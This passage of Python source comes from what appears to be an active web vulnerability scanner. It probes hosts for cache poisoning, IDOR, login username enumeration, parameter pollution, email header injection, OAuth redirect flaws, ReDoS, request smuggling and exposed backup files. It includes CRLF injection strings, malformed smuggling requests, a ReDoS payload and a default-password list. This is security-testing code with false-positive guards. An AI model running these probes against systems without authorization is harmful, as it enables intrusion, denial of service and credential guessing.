       serving the injected marker proves the cache stored it."""
    marker = f"subenum-{os.urandom(4).hex()}.poison.test"
    hit = tested = 0
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        targets = [h for h in sorted(probes) if probes[h].get("status") == 200][:cap_hosts]
        sem = asyncio.Semaphore(12)

        async def one(h):
            nonlocal hit, tested
            base = _burl(probes, h)
            path = "/"                      # proven-200 root: a random 404 path
            async with sem:                 # is never cacheable, so poison the
                st, body, _ = await _grab(s, base + path, timeout=6, limit=16000)
                if st is None or st >= 400:
                    return                      # uncached/absent path: nothing to poison
                tested += 1
                for hdr in CACHE_HEADERS:
                    st2, body2, _ = await _grab(s, base + path, timeout=6,
                                                limit=16000, headers={hdr: marker})
                    if st2 != st or marker.encode() not in body2:
                        continue                # header not reflected here
                    await asyncio.sleep(0.4)
                    st3, body3, _ = await _grab(s, base + path, timeout=6, limit=16000)
                    if body3 and marker.encode() in body3:
                        hit += 1
                        findings.append(
                            f"[CACHE-POISON] {h} cache stores unkeyed {hdr} "
                            f"(marker persisted on plain follow-up of {path})")
                        return
        await asyncio.gather(*[one(h) for h in targets])
    if tested:
        print(f"  [cache] -> {hit} poisoned-cache hit(s) on {tested} host(s)", flush=True)
    return hit


ID_PATH_RX = re.compile(
    r"/(?:[a-z0-9_-]*(?:id|uid|user|order|invoice|post|doc|file)[a-z0-9_-]*/)?"
    r"(?:\d{1,12}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"
    r"(?:/|$|\?)", re.I)


def _body_similar(a, b):
    if not a or not b:
        return False
    if a[:300] == b[:300]:
        return True
    if abs(len(a) - len(b)) > max(50, int(max(len(a), len(b)) * 0.15)):
        return False
    # length alone must never prove "same page" - a similarly-sized
    # access-denied / error page must not match the real one. same
    # template with a dynamic head still matches (shared tail), and a
    # ratio check catches the rest.
    n = min(len(a), len(b))
    tail = max(32, n // 4)
    if a[-tail:] == b[-tail:]:
        return True
    try:
        import difflib
        ra = a[-2048:].decode("latin-1", "ignore")
        rb = b[-2048:].decode("latin-1", "ignore")
        return difflib.SequenceMatcher(None, ra, rb, autojunk=True).ratio() >= 0.90
    except Exception:
        return False


async def idor_matrix(probes, crawl_rows, findings, auth_b, cap_urls=60, per_host=6):
    """two-account object check: --auth-b must NOT read the same resource as auth A
       (random-id control filters always-200 pages)."""
    if not auth_b:
        return 0
    if ":" not in auth_b:
        print("  [idor] --auth-b must look like \"Header-Name: value\"", flush=True)
        return 0
    hk, hv = auth_b.split(":", 1)
    hb = {hk.strip(): hv.strip()}
    pairs, per = [], Counter()
    for row in crawl_rows or ():
        if "\t" not in row:
            continue
        h, p = row.split("\t", 1)
        if not p or per[h] >= per_host:
            continue
        if "?" not in p and ID_PATH_RX.search(p):
            per[h] += 1
            pairs.append((h, p))
        elif "?" in p:
            # object id in the query string: ?id=, ?user_id=, ?order=...
            mq = re.search(r"(\w[\w-]*)=(\d+)", p)
            if mq and ("id" in mq.group(1).lower()
                       or mq.group(1).lower() in (
                           "order", "invoice", "ticket", "doc", "file",
                           "item", "post", "user", "sku", "ref")):
                per[h] += 1
                pairs.append((h, p))
    pairs = pairs[:cap_urls]
    if not pairs:
        return 0
    hit = 0
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s, \
            _ProxySession(connector=aiohttp.TCPConnector(limit=0, ssl=False),
                          headers=dict(hb),
                          trace_configs=[_RATE_TRACE]) as sB, \
            xsession(aiohttp.TCPConnector(limit=0, ssl=False)) as sN:
        # sB carries ONLY the account-B credential: if it were layered on
        # top of tsession's --cookie/--authorization, the server would
        # authenticate as A on both legs and every comparison would match
        # sN carries NO credentials - its leg separates public resources
        # (anon reads them: no authz boundary exists) from real candidates
        async def one(h, p):
            nonlocal hit
            base = _burl(probes, h)
            st, body, _ = await _grab(s, base + p, timeout=6, limit=60000)
            if st != 200:
                return
            ctrl = None
            mq = re.search(r"(\w[\w-]*)=(\d+)", p) if "?" in p else None
            if mq:
                ctrl = p[:mq.start(2)] + "7349827345" + p[mq.end(2):]
            elif re.search(r"\d+/?$", p):
                ctrl = re.sub(r"\d+(/?)$", r"7349827345\1", p)
            elif re.search(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
                           p, re.I):
                ctrl = re.sub(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
                              "00000000-0000-4000-8000-000000000000", p, flags=re.I)
            if ctrl and ctrl != p:
                cst, cbody, _ = await _grab(s, base + ctrl, timeout=6, limit=60000)
                if cst == 200 and _body_similar(cbody, body):
                    return                      # random id looks identical: soft-404
            # public-resource gate: an UNAUTHENTICATED GET reading the same
            # object means there is no authorization boundary to break -
            # "both accounts can read it" is then expected behaviour, not an
            # object-level authz failure (no-FP guard)
            ast, abody, _ = await _grab(sN, base + p, timeout=6, limit=60000)
            if ast == 200 and _body_similar(abody, body):
                return
            stb, bbody, _ = await _grab(sB, base + p, timeout=6, limit=60000)
            if stb == 200 and _body_similar(bbody, body):
                hit += 1
                findings.append(
                    f"[IDOR] {h}{p} readable by BOTH accounts (auth A and --auth-b "
                    f"return the same object) - object-level authz likely missing")

        await asyncio.gather(*[one(h, p) for h, p in pairs])
    if pairs:
        print(f"  [idor] -> {hit} possible hit(s) / {len(pairs)} object(s) "
              f"(verify with owned resources)", flush=True)
    return hit


# ---------------- active: login enum / HPP / email header injection ----------------
LOGIN_FORM_RX = re.compile(rb"<form\b([^>]*)>(.*?)</form>", re.S | re.I)
LOGIN_INP_RX = re.compile(rb"<input\b([^>]*)>", re.S | re.I)
LOGIN_ATTR_RX = re.compile(
    rb"""([\w:-]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'<>`]+))""")


def _login_attrs(tag):
    """input/form attribute dict (str keys, bytes values); accepts quoted
    AND unquoted values."""
    out = {}
    for m in LOGIN_ATTR_RX.finditer(tag):
        v = (m.group(2) if m.group(2) is not None else
             m.group(3) if m.group(3) is not None else m.group(4))
        out[m.group(1).decode("latin-1").lower()] = v
    return out
LOGIN_DYN_RX = re.compile(
    rb"[0-9a-f]{16,}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}"
    rb"-[0-9a-f]{12}|[A-Za-z0-9+/]{40,}={0,2}|\d{6,}", re.I)
LOGIN_USER_RX = re.compile(
    rb"^(?:user|username|user_?name|login|logon|email|e_?mail|account|"
    rb"member|identifier|id|signin|login_?id|user_?id|mail)$", re.I)
PW_FIELD_RX = re.compile(rb"""type\s*=\s*["']?password["']?""", re.I)


def _login_norm(b, *subs):
    """response body minus dynamic tokens (csrf/hex/ids) and the probed
    usernames - comparable across requests."""
    b = b or b""
    for s in subs:
        if s:
            b = b.replace(s, b"<u>")
    return re.sub(rb"\s+", b" ", LOGIN_DYN_RX.sub(b"#", b)).strip()


def _diff_line(a, b):
    ta, tb = a.split(b" "), b.split(b" ")
    for x, y in zip(ta, tb):
        if x != y:
            return f' (e.g. "{y.decode("latin-1", "ignore")[:60]}")'
    if len(tb) != len(ta) and tb:
        return f' (e.g. "{tb[-1].decode("latin-1", "ignore")[:60]}")'
    return ""


async def login_enum(probes, findings, cap_forms=3, per_form=3):
    """login username enumeration via control-vs-candidate differential:
    two random nonexistent users must produce identical normalized
    responses (stability control); a candidate username (admin ...) that
    differs from that stable control proves the error message discloses
    account existence. POST/GET form submission only, <= 2 + per_form
    requests per form, random users only (never harvested addresses).
    returns findings added."""
    hosts = [h for h in sorted(probes)
             if probes[h].get("status")
             and PW_FIELD_RX.search(probes[h].get("body") or b"")]
    if not hosts:
        return 0
    hit = forms_done = 0
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        for h in hosts:
            if forms_done >= cap_forms:
                break
            info = probes[h]
            body = info.get("body") or b""
            loc = str(info.get("final_url") or _burl(probes, h))
            if body.count(b"<form") > 8 * body.count(b"</form>") + 8:
                continue   # hostile unbalanced openers: lazy scan would be O(n^2)
            for m in LOGIN_FORM_RX.finditer(body):
                fattrs, fcontent = m.group(1), m.group(2)
                if not PW_FIELD_RX.search(fcontent):
                    continue
                user_key = pass_key = None
                hidden = {}
                for im in LOGIN_INP_RX.finditer(fcontent):
                    attrs = _login_attrs(im.group(1))
                    typ = attrs.get("type", b"text").lower()
                    name = attrs.get("name") or attrs.get("id") or b""
                    if not name:
                        continue
                    if typ == b"hidden":
                        hidden[name.decode("latin-1")] = attrs.get(
                            "value", b"").decode("latin-1")
                    elif typ == b"password":
                        pass_key = name
                    elif typ in (b"text", b"email", b"user", b"") and not user_key \
                            and LOGIN_USER_RX.match(name):
                        user_key = name
                if not (user_key and pass_key):
                    continue
                uk = user_key.decode("latin-1")
                pk = pass_key.decode("latin-1")
                am = re.search(
                    rb"""action\s*=\s*(?:["']([^"']*)["']|([^\s>]+))""",
                    fattrs, re.I)
                if am:
                    aval = (am.group(1) if am.group(1) is not None
                            else (am.group(2) or b""))
                    action = urljoin(loc, aval.decode("latin-1", "ignore"))
                else:
                    action = loc
                pa = urlsplit(action)
                if pa.scheme not in ("http", "https") or (
                        pa.netloc and pa.netloc.lower()
                        not in (urlsplit(loc).netloc.lower(), h.lower())):
                    continue               # cross-origin / non-http -> skip
                mm = re.search(
                    rb"""method\s*=\s*(?:["'](\w+)["']|(\w+))""",
                    fattrs, re.I)
                meth = (mm.group(1) or mm.group(2) or b"").lower() if mm else b""
                use_get = meth == b"get"
                forms_done += 1

                async def send(u, p):
                    data = dict(hidden)
                    data[uk] = u
                    data[pk] = p
                    async with HTTP_SEM:
                        try:
                            if use_get:
                                async with s.get(action, params=data,
                                                 timeout=aiohttp.ClientTimeout(
                                                     total=10),
                                                 allow_redirects=False,
                                                 ssl=False) as r:
                                    return r.status, await r.content.read(60_000)
                            async with s.post(action, data=data,
                                              timeout=aiohttp.ClientTimeout(
                                                  total=10),
                                              allow_redirects=False,
                                              ssl=False) as r:
                                return r.status, await r.content.read(60_000)
                        except Exception:
                            return None

                u1, u2 = f"sxeu{os.urandom(4).hex()}", f"sxeu{os.urandom(4).hex()}"
                pw = f"Sxe!{os.urandom(5).hex()}"
                c1 = await send(u1, pw)
                c2 = await send(u2, pw)
                if not c1 or not c2 or c1[0] != c2[0]:
                    continue               # unstable -> cannot conclude
                if _login_norm(c1[1], u1.encode()) != _login_norm(
                        c2[1], u2.encode()):
                    continue               # controls differ -> no evidence
                ctrl_n = _login_norm(c1[1], u1.encode())
                found = False
                for cand in ("admin", "administrator", "test")[:per_form]:
                    cp = await send(cand, pw)
                    if not cp:
                        continue
                    if cp[0] in (429, 503) or c1[0] in (429, 503):
                        continue   # throttled/overloaded: not disclosure
                    cand_n = _login_norm(cp[1], cand.encode())
                    if cp[0] != c1[0] or cand_n != ctrl_n:
                        hit += 1
                        findings.append(
                            f"[LOGIN-ENUM] {action} responds differently for "
                            f"user {cand!r} ({cp[0]}, {len(cp[1])}B) vs random "
                            f"control ({c1[0]}, {len(c1[1])}B) - error text "
                            f"discloses account existence"
                            f"{_diff_line(ctrl_n, cand_n)}")
                        found = True
                        break
                if found:
                    break
    if forms_done:
        print(f"  [login-enum] -> {hit} disclosure(s) / {forms_done} form(s)",
              flush=True)
    return hit


async def hpp_check(probes, attrib, findings, cap=30):
    """HTTP Parameter Pollution: send one query key twice with two distinct
    canaries. BOTH canaries present (in the body, or split across body and
    Location) proves the key is not deduped - the backend may parse a
    different value than the frontend. unique canaries -> zero control
    traffic needed. returns findings added."""
    if not attrib:
        return 0
    jobs, seen = [], set()
    for path, hs in attrib.items():
        if "?" not in path:
            continue
        head, _, q = path.partition("?")
        keys = [kv.split("=", 1)[0] for kv in q.split("&") if kv]
        k = next((x for x in keys if 0 < len(x) < 40), None)
        if not k:
            continue
        h = next((x for x in sorted(hs)
                  if x in probes and probes[x].get("status")), None)
        if not h or (h, k) in seen:
            continue
        seen.add((h, k))
        parts, done = [], False
        for kv in q.split("&"):
            if kv.split("=", 1)[0] == k and not done:
                parts.append(f"{k}=sxeHpA1")
                parts.append(f"{k}=sxeHpB2")
                done = True
            else:
                parts.append(kv)
        jobs.append((h, f"{head}?{'&'.join(parts)}"))
        if len(jobs) >= cap:
            break
    if not jobs:
        return 0
    hit = 0
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        async def one(h, p):
            nonlocal hit
            st, body, hdr = await _grab(s, _burl(probes, h) + p, timeout=6,
                                        limit=60000)
            if st != 200 or not body:
                return
            loc = (hdr.get("location") or hdr.get("Location") or "").encode()
            hay = body + b"\n" + loc
            if b"sxeHpA1" in hay and b"sxeHpB2" in hay:
                where = ("in the body" if b"sxeHpA1" in body
                         and b"sxeHpB2" in body
                         else "split across body/Location")
                hit += 1
                findings.append(
                    f"[HPP] {h}{p} reflects both duplicate values ({where}) - "
                    f"key not deduped, backend may parse a different value "
                    f"than the frontend (HTTP Parameter Pollution)")
        await asyncio.gather(*[one(h, p) for h, p in jobs])
    if jobs:
        print(f"  [hpp] -> {hit} hit(s) / {len(jobs)} param(s)", flush=True)
    return hit


EMAIL_KEY_RX = re.compile(
    r"mail|e-?mail|from|sender|recipient|reply|to_?addr|contact|notify"
    r"|subscribe|invite|forward|share|cc|bcc", re.I)


async def email_inject(probes, attrib, findings, cap=12):
    """email header injection on mail-ish parameters: a control value must
    reflect first (proves THIS field is the channel), then the same value
    with %0d%0aBcc:... appended - the Bcc marker surviving into the
    response proves CR/LF is not sanitized on the message-composition path.
    returns findings added."""
    if not attrib:
        return 0
    jobs = []
    for path, hs in attrib.items():
        if "?" not in path:
            continue
        head, _, q = path.partition("?")
        picked = None
        for kv in q.split("&"):
            k, _, v = kv.partition("=")
            if not k or len(k) > 40 or not v:
                continue
            vd = v.replace("%40", "@").replace("%2f", "/")
            if EMAIL_KEY_RX.search(k) or ("@" in vd and len(vd) < 80):
                picked = k
                break
        if not picked:
            continue
        h = next((x for x in sorted(hs)
                  if x in probes and probes[x].get("status")), None)
        if h:
            jobs.append((h, head, q, picked))
        if len(jobs) >= cap:
            break
    if not jobs:
        return 0
    hit = 0
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with tsession(conn) as s:
        async def one(h, head, q, k):
            nonlocal hit
            tok = os.urandom(4).hex()
            ctl = f"sxe-ctl@{tok}.test"

            def build(val):
                parts, done = [], False
                for kv in q.split("&"):
                    if kv.split("=", 1)[0] == k and not done:
                        parts.append(f"{k}={val}")
                        done = True
                    else:
                        parts.append(kv)
                return f"{head}?{'&'.join(parts)}"

            url = _burl(probes, h)
            st1, b1, _ = await _grab(s, url + build(ctl), timeout=6,
                                     limit=60000)
            if st1 != 200 or not b1 or (
                    ctl.encode() not in b1
                    and f"sxe-ctl%40{tok}".encode() not in b1):
                return                      # channel not proven -> no claim
            marker = f"Bcc:sxe-hi@{tok}.test"
            st2, b2, _ = await _grab(s, url + build(
                quote(ctl + "\r\n" + marker, safe="")), timeout=6, limit=60000)
            if not st2 or not b2:
                return
            low = b2.lower()
            # evidence = the DECODED CRLF sitting between the control token
            # and the marker (payload order preserved). a still-percent-
            # encoded echo is plain reflection (the control already proved
            # that) and a stripped separator means injection is impossible;
            # neither is a finding. adjacency check beats a bare newline
            # search: pretty-printed markup has newlines everywhere.
            if not re.search(rb"sxe-ctl\S*[\r\n]+\s*bcc:", low):
                return
            hit += 1
            findings.append(
                f"[EMAIL-INJECT] {h}{build('...')} field `{k}` carries "
                f"the injected Bcc header into the response (raw CRLF "
                f"survives between the control token and the marker; "
                f"control value reflects) - email header injection when "
                f"composed into a message")
        await asyncio.gather(*[one(*j) for j in jobs])
    if jobs:
        print(f"  [email-inject] -> {hit} hit(s) / {len(jobs)} param(s)",
              flush=True)
    return hit


IDOR_KEY_RX = re.compile(
    r"(?:^|_)(?:id|uid|pid|oid|guid|ref)$|_id$|"
    r"^(?:order|invoice|item|object|doc|file|profile|user|account|post|"
    r"article|page|msg|message|ticket)s?$", re.I)


async def idor_probe(probes, attrib, findings, cap=15, ctl=987654321):
    """unauthenticated sequential-object (IDOR) check needing no second
    account: a numeric object id and its NEIGHBOR both return readable
    200 objects with differing bodies while a huge control id is rejected
    with a 4xx -> objects enumerable with no authz. soft-404 catch-alls,
    identical/near-identical bodies, or a 200 control produce no finding
    (no-FP guard). precision gate: hosts with NO access-control signal at
    all (no login/password form on the probed page and no configured
    --cookie/--authorization session) serve public content - sequential
    ids crossing no authorization boundary are not an IDOR. reuses the
    IDOR tag. returns findings added."""
    if not attrib:
        return 0
    jobs, seen = [], set()
    for path, hs in attrib.items():
        if "?" not in path:
            continue
        head, _, q = path.partition("?")
        picked, v0 = None, 0
        for kv in q.split("&"):
            k, _, v = kv.partition("=")
            if v.isdigit() and 1 <= len(v) <= 9 and IDOR_KEY_RX.search(k):
                picked, v0 = k, int(v)
                break
        if not picked:
            continue
        h = next((x for x in sorted(hs)
                  if x in probes and probes[x].get("status")), None)
        if not h or (h, picked) in seen:
            continue
        if not AUTH_HEADERS and not PW_FIELD_RX.search(
                probes.get(h, {}).get("body") or b""):
            continue          # public site: no authz boundary, no IDOR claim
        seen.add((h, picked))
        jobs.append((h, head, q, picked, v0))
        if len(jobs) >= cap:
            break
    if not jobs:
        return 0
    hit = 0
    conn = aiohttp.TCPConnector(limit=8, ssl=False)
    async with tsession(conn) as s:
        sem = asyncio.Semaphore(6)

        async def one(h, head, q, k, v0):
            nonlocal hit

            def build(val):
                parts, done = [], False
                for kv in q.split("&"):
                    if kv.split("=", 1)[0] == k and not done:
                        parts.append(f"{k}={val}")
                        done = True
                    else:
                        parts.append(kv)
                return f"{head}?{'&'.join(parts)}"

            async with sem:
                url = _burl(probes, h)
                r1, r2, r3 = await asyncio.gather(
                    _grab(s, url + build(v0), timeout=6, limit=30000),
                    _grab(s, url + build(v0 + 1), timeout=6, limit=30000),
                    _grab(s, url + build(ctl), timeout=6, limit=30000))
            (s1, b1, _), (s2, b2, _), (s3, _b3, _) = r1, r2, r3
            if s1 != 200 or s2 != 200 or len(b1) < 80 or len(b2) < 80:
                return
            if _body_similar(b1, b2):
                return                      # same template / soft-404
            if s3 not in (400, 401, 403, 404, 410, 422):
                return                      # catch-all 200 -> no evidence
            hit += 1
            findings.append(
                f"[IDOR] {h}{build('...')} objects {k}={v0} and "
                f"{k}={v0 + 1} both readable (200, {len(b1)}B/{len(b2)}B, "
                f"differing bodies) while control {k}={ctl} is rejected "
                f"({s3}) - sequential ids enumerable with no authz")
        await asyncio.gather(*[one(*j) for j in jobs])
    if jobs:
        print(f"  [idor-probe] -> {hit} hit(s) / {len(jobs)} param(s)",
              flush=True)
    return hit


OAUTH_PROBE_URL = "https://sxe-oauth-probe.invalid/cb"
REDIR_PARAM_RX = re.compile(
    r"(redirect_uri|redirect_url|oauth_callback|callback|return_url"
    r"|return_to|continue|next|dest|destination)=([^&\"'#\s>]+)", re.I)


def _oauth_authorize_urls(body):
    """harvest OAuth/OIDC authorize URLs carrying a redirect target."""
    if not body:
        return []
    txt = (body.decode("latin-1", "ignore")
           if isinstance(body, (bytes, bytearray)) else str(body))
    out = []
    for m in OAUTH_ATTR_RX.finditer(txt):
        u = m.group(1).replace("&amp;", "&")
        low = u.lower()
        if not ("authorize" in low or "oauth" in low or "openid" in low):
            continue
        if not ("client_id=" in low or "response_type=" in low):
            continue
        if REDIR_PARAM_RX.search(u):
            out.append(u)
    return out


async def oauth_redirect_check(probes, findings, cap=4):
    """OAuth/OIDC redirect_uri allowlist check: an authorize URL (with
    client_id/response_type) gets its redirect parameter swapped for an
    external canary; a 3xx Location starting with the canary (never
    followed) proves redirect_uri is not validated -> authorization-code
    theft. error pages, same-host redirects or no candidate -> no finding
    (no-FP guard). returns findings added."""
    n0 = len(findings)
    cands, seen = [], set()
    for h, i in sorted(probes.items()):
        for u in _oauth_authorize_urls(i.get("body") or b""):
            if u in seen:
                continue
            seen.add(u)
            cands.append((h, u))
    if not cands:
        return 0
    conn = aiohttp.TCPConnector(limit=4, ssl=False)
    async with tsession(conn) as s:
        for h, u in cands[:cap]:
            probe, nrep = REDIR_PARAM_RX.subn(
                lambda m: m.group(1) + "=" + quote(OAUTH_PROBE_URL, safe=""),
                u, count=1)
            if nrep != 1 or probe == u:
                continue
            if probe.startswith("//"):
                probe = "https:" + probe
            elif not re.match(r"^https?://", probe, re.I):
                probe = urljoin(_burl(probes, h), probe)
            st, _b, hdr = await _grab(s, probe, timeout=8, redirects=False)
            if st not in (301, 302, 303, 307, 308):
                continue
            loc = (hdr.get("location") or hdr.get("Location") or "").strip()
            if loc.lower().startswith(OAUTH_PROBE_URL.lower()):
                findings.append(
                    f"[OAUTH-REDIR] {h} authorize endpoint redirects to the "
                    f"unregistered redirect_uri (Location: {loc[:90]}) - "
                    f"authorization-code theft / account takeover")
    return len(findings) - n0


REDOS_PARAM_RX = re.compile(
    r"^(?:q|query|search|s|filter|regex|regexp|pattern|term|keyword|keywords"
    r"|words|input|str|string|text)$", re.I)
REDOS_SUB_RX = re.compile(r"search|filter|regex|query|pattern", re.I)


async def redos_check(probes, attrib, findings, cap=6, slow_floor=2.0,
                      max_ctrl=1.5):
    """time-based ReDoS: a search-ish parameter gets a nested-quantifier
    payload twice; BOTH evil runs must take >= max(slow_floor, 8x control)
    while the control stays fast (< max_ctrl) AND the endpoint recovers
    fast after the evil pair - a slow baseline, a rate-limiter that trips
    mid-run, or one-off slowness produces no finding (no-FP guard). the
    four requests of a job run sequentially (never overlapping); jobs
    share a small semaphore. returns findings added."""
    if not attrib:
        return 0
    jobs, seen = [], set()
    for path, hs in attrib.items():
        if "?" not in path:
            continue
        head, _, q = path.partition("?")
        picked = None
        for kv in q.split("&"):
            k, _, v = kv.partition("=")
            if not v or len(k) > 40:
                continue
            if REDOS_PARAM_RX.match(k) or (
                    len(k) <= 30 and REDOS_SUB_RX.search(k)):
                picked = k
                break
        if not picked:
            continue
        h = next((x for x in sorted(hs)
                  if x in probes and probes[x].get("status")), None)
        if not h or (h, picked) in seen:
            continue
        seen.add((h, picked))
        jobs.append((h, head, q, picked))
        if len(jobs) >= cap:
            break
    if not jobs:
        return 0
    hit = 0
    conn = aiohttp.TCPConnector(limit=4, ssl=False)
    async with tsession(conn) as s:
        sem = asyncio.Semaphore(3)
        EVIL = "a" * 29 + "!"

        async def one(h, head, q, k):
            nonlocal hit

            def build(val):
                parts, done = [], False
                for kv in q.split("&"):
                    if kv.split("=", 1)[0] == k and not done:
                        parts.append(f"{k}={val}")
                        done = True
                    else:
                        parts.append(kv)
                return f"{head}?{'&'.join(parts)}"

            url = _burl(probes, h)

            async def timed(val):
                t0 = time.time()
                st, _b, _h = await _grab(s, url + build(val), timeout=10,
                                         limit=4000)
                return time.time() - t0, st

            async with sem:
                tc, sc = await timed("sxectl")
                if sc != 200 or tc >= max_ctrl:
                    return                  # slow/absent baseline -> no claim
                t1, _s1 = await timed(EVIL)
                t2, _s2 = await timed(EVIL)
                # recovery control: a host that starts rate-limiting /
                # hanging after request #2 makes both evil runs look slow
                # while the fast baseline was long ago - must recover.
                # a healthy-then-fast control also proves the evil timeouts
                # (>10s, counted by elapsed) were per-request, not a host
                # that simply stopped answering (that fails this check)
                tr, sr = await timed("sxectl")
                if sr != 200 or tr >= max_ctrl:
                    return                  # not recovered: inconclusive
            slow_at = max(slow_floor, tc * 8)
            if t1 >= slow_at and t2 >= slow_at:
                hit += 1
                findings.append(
                    f"[REDOS] {h}{build('...')} param `{k}`: control "
                    f"{tc:.1f}s vs {t1:.1f}s and {t2:.1f}s for a "
                    f"nested-quantifier payload (repeated) - catastrophic "
                    f"regex backtracking, request-flood DoS")
        await asyncio.gather(*[one(*j) for j in jobs])
    if jobs:
        print(f"  [redos] -> {hit} hit(s) / {len(jobs)} param(s)", flush=True)
    return hit


async def smuggle_scan(probes, findings, cap_hosts=12, wait=2.0):
    """CL.TE timing probe: dual Content-Length/Transfer-Encoding where CL truncates
       the body hangs only when an intermediary splits front/back protocols;
       standalone servers always answer fast (400 or processed). Two consecutive
       timeouts on fresh connections -> possible smuggling (verify manually)."""
    hit = tested = 0
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    sem = asyncio.Semaphore(4)

    payloads = (
        ("CL.TE", lambda host: (f"POST /subenum-smuggle HTTP/1.1\r\nHost: {host}\r\n"
                                f"Connection: close\r\n"
                                f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
                                f"0\r\n\r\n").encode()),
        ("TE.CL", lambda host: (f"POST /subenum-smuggle HTTP/1.1\r\nHost: {host}\r\n"
                                f"Connection: close\r\n"
                                f"Content-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n"
                                f"0\r\n\r\n").encode()),
        ("dup-CL", lambda host: (f"POST /subenum-smuggle HTTP/1.1\r\nHost: {host}\r\n"
                                 f"Connection: close\r\n"
                                 f"Content-Length: 4\r\nContent-Length: 8\r\n\r\n"
                                 f"abcd\r\n\r\n").encode()),
        ("TE-space", lambda host: (f"POST /subenum-smuggle HTTP/1.1\r\nHost: {host}\r\n"
                                   f"Connection: close\r\n"
                                   f"Content-Length: 5\r\n"
                                   f"Transfer-Encoding : chunked\r\n\r\n"
                                   f"0\r\n\r\n").encode()),
    )

    async def timed(host, port, ctx, payload):
        # returns ("ok", elapsed, data) | "hang" (no answer) | "conn"
        # (connect failed). "conn" must never count as a desync signal:
        # a host that starts refusing connections after the baseline
        # would otherwise produce two fake timeouts.
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx), 6)
        except Exception:
            return "conn"
        try:
            t0 = time.time()
            writer.write(payload)
            await writer.drain()
            try:
                data = await asyncio.wait_for(reader.read(4096), wait)
            except (asyncio.TimeoutError, TimeoutError):
                return "hang"                # front truncated, back waiting
            return ("ok", time.time() - t0, data)
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

    async def one(h):
        nonlocal hit, tested
        sc = probes[h].get("scheme") or "https"
        host, port = h, (443 if sc == "https" else 80)
        if h.count(":") == 1 and h.split(":")[1].isdigit():
            host, port = h.split(":")[0], int(h.split(":")[1])
        ctx = ssl.create_default_context() if sc == "https" else None
        async with sem:
            base = await timed(host, port, ctx,
                               f"GET / HTTP/1.1\r\nHost: {h}\r\n"
                               f"Connection: close\r\n\r\n".encode())
            if not isinstance(base, tuple) or base[1] > 1.5:
                return                          # connect failure / slow host
            tested += 1
            for name, mk in payloads:
                t1 = await timed(host, port, ctx, mk(h))
                if t1 != "hang":
                    continue                    # answered or connect failed: no signal
                t2 = await timed(host, port, ctx, mk(h))
                if t2 == "hang":                # reproduced on a fresh connection
                    hit += 1
                    findings.append(
                        f"[SMUGGLING] {h} possible {name} desync: dual/"
                        f"obfuscated framing hangs after a fast baseline "
                        f"(proxy front/back mismatch) - verify manually")
                    return

    await asyncio.gather(*[one(h) for h in targets])
    if tested:
        print(f"  [smuggle] -> {hit} possible desync(s) / {tested} host(s) timed",
              flush=True)
    return hit


# ---------------- phase 16 extra: backup files / rate limit / default creds ----------------
BACKUP_SRC_RX = re.compile(
    r"\.(php[3457]?|phtml|inc|aspx?|ashx|asmx|jsp[2]?|jspx|do|action|cgi|pl|py|rb|"
    r"go|env|ini|conf|config|ya?ml|toml|xml|sql|properties)(?:[?#/]|$)", re.I)
BACKUP_EXT = (".bak", ".old", ".copy", ".swp", "~",
              ".zip", ".tar.gz", ".tar", ".tgz", ".orig", ".dump")
BACKUP_REV_EXT = (".bak", ".old", ".orig", ".copy")
BACKUP_MARK = (b"<?php", b"<?=", b"function ", b"public function", b"class ",
               b"require ", b"include ", b"password", b"passwd", b"api_key",
               b"apikey", b"secret", b"select ", b"insert into", b"create table",
               b"defined(", b"namespace ", b"def ", b"package ", b"import ",
               b"PK\x03\x04", b"\x1f\x8b\x08",      # zip / gzip magic
               b"console.log", b"db_", b"<?xml")
AUTH_LIKE_RX = re.compile(
    r"(?:^|/)(?:login|logon|signin|sign-?in|auth|oauth|session|password|passwd|"
    r"reset|forgot|otp|verify|mfa|2fa|token|account)(?:[/.]|$)", re.I)
BASIC_CREDS = (("admin", "admin"), ("admin", "password"), ("admin", "123456"),
               ("admin", "admin123"), ("root", "root"), ("test", "test"),
               ("guest", "guest"), ("user", "user"))


async def backup_scan(probes, pairs, findings, cap_hosts=15, per_host=8):
    """fuzz discovered source/config paths with .bak/.old/.copy/.swp/~ suffixes -
       a hit needs a non-HTML code-marker body and must beat the soft-404 baseline."""
    byhost = {}
    for h, p in pairs:
        if not h or not p or h not in probes or not probes[h].get("status"):
            continue
        if not p.startswith("/"):
            p = "/" + p
        p = p.split("?")[0]
        if BACKUP_SRC_RX.search(p):
            byhost.setdefault(h, set()).add(p)
    if not byhost:
        print("  [backup] no source/config paths to fuzz", flush=True)
        return 0
    hits = 0
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    rng = os.urandom(3).hex()
    async with tsession(conn) as s:
        for h in sorted(byhost)[:cap_hosts]:
            base = _burl(probes, h)
            bst, bbody, _ = await _grab(s, f"{base}/sxnbf-{rng}.bak", timeout=5)
            for p in sorted(byhost[h])[:per_host]:
                cands = [f"{base}{p}{ext}" for ext in BACKUP_EXT]
                # reversed placement: config.bak.php / index.old.jsp style
                # backups keep the original extension so the server still
                # routes them through the source handler
                stem, sxext = os.path.splitext(p)
                if sxext and len(sxext) <= 9:
                    cands += [f"{base}{stem}{e}{sxext}" for e in BACKUP_REV_EXT]
                for url in cands:
                    st, body, _ = await _grab(s, url, timeout=5, limit=40_000)
                    if st != 200 or not body:
                        continue
                    head = body[:300].lower()
